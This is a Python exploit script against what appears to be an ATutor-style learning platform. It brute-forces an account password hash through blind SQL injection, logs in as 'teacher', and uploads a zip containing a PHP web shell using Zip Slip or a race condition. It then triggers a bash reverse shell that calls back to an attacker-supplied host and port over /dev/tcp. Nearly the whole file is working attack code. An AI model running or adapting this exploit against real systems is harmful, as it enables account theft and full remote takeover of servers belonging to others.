import requests
import hashlib
from os.path import exists
import zipfile
import os
import socket
import sys


if len(sys.argv) < 5:
    print("- Usage: python exploit.py <target_host> <target_port> <listen_host> <listen_port> [attack_type] ")
    print("- Define attack type: 1 - Zip Slip, 2 - Race Condition")

R_HOST = sys.argv[1]
R_PORT = int(sys.argv[2])
L_HOST = sys.argv[3]
L_PORT = sys.argv[4]
ATTACK_TYPE = int(sys.argv[5]) if (len(sys.argv) >= 6) else 1

URL = f"http://{R_HOST}:{R_PORT}"
COMMAND = f'bash -c \\"/bin/bash -i >& /dev/tcp/{L_HOST}/{L_PORT} 0>&1\\"'
FILENAME = "rce.pht"
ZIPNAME = "rce.zip"


s = requests.Session()


def brute_force(password):
    target = URL + "/mods/_standard/social/index_public.php"
    injection_string = (
        "'/**/AND/**/member_id=1/**/AND/**/password/**/LIKE/**/'{password}%%')/**/#"
    )
    params = {
        "search_friends": injection_string.format(password=password)
    }
    data = {
        "myFriendsOnly": "abc"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36"
    }

    r = s.post(url=target, headers=headers, params=params, data=data)

    if "Nhan gia  lang la" in r.text:
        print("Password: " + password)
        return 1
    else:
        return 0


def sqli():
    password = ""
    for _ in range(40):
        for char in "0123456789abcdef":
            result = brute_force(password + char)
            if result == 1:
                password += char
                break
    return password


def login(password):
    target = URL + "/login.php"

    token = "abc"
    hashed_password = hashlib.sha1(
        (password + token).encode("UTF-8")).hexdigest()

    data = {
        "form_login_action": "true",
        "form_course_id": "0",
        "form_password_hidden": hashed_password,
        "p": "",
        "form_login": "teacher",
        "form_password": "",
        "submit": "Login",
        "token": token
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36"
    }

    r = s.post(url=target, data=data, headers=headers)

    if "You have logged in successfully." in r.text:
        print("[*] Log in successfully")
        return 1
    else:
        return 0


def create_zip(command, filename, zipname, type):
    content = (
        '<?php system("{command}"); ?>'
    )
    f = open(filename, "w")
    f.write(content.format(command=command))
    f.close()

    if (type == 1):     # Zip Slip
        try:
            cmd = (
                "python evilarc.py -f{zipname} -d1 -ounix {filename}"
            )
            os.system(cmd.format(zipname=zipname, filename=filename))
            print("[*] Attack type 1: Zip file successfully")
            return 1
        except Exception:
            print("[!] Error zipping file")
            return -1

    elif (type == 2):    # Race Condition
        try:
            zipfile.ZipFile(zipname, mode='w').write(filename)
            print("[*] Attack type 2: Zip file successfully 2")
            return 1
        except Exception:
            print("[!] Error zipping file")
            return -1


def upload_zip(zipname):
    target = URL + "/mods/_standard/tests/import_test.php"
    params = {
        "h": "abc",
        "tile": "abc"
    }
    files = {"file": open(zipname, "rb")}
    data = {
        "submit_import": "abc"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36"
    }

    r = s.post(url=target, params=params, files=files, data=data, headers=headers)
    if r.status_code == 404:
        print("[*] Upload zip successfully, waiting for server to extract")
    else:
        print("[!] Something wrong")


def create_socket(host, port):
    client_socket = socket.socket()
    client_socket.connect((host, port))
    return client_socket


def send_data(client_socket, packet):
    message = packet
    client_socket.send(message.encode())


def recv_data(client_socket):
    data = client_socket.recv(15).decode()
    return data


def close_socket(client_socket):
    client_socket.close()


def rce(filename):
    my_socket = []
    for i in range(100):
        tmp = create_socket(R_HOST, R_PORT)
        my_socket.append(tmp)
        send_data(tmp, f"""GET /{filename} HTTP/1.1
Host: {R_HOST}:{R_PORT}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Connection: close
""".replace("\n", "\r\n"))
    for i in range(100):
        send_data(my_socket[i], "\r\n")
    for i in range(100):
        close_socket(my_socket[i])


if __name__ == "__main__":
    if not exists("password.txt"):
        password = sqli()
        f = open("password.txt", "w")
        f.write(password)
        f.close()
    else:
        password_file = open("password.txt", "r")
        password = password_file.read()
        print("[*] Password already found: " + password)

    login(password)
    create_zip(COMMAND, FILENAME, ZIPNAME, ATTACK_TYPE)
    upload_zip(ZIPNAME)
    rce(FILENAME)
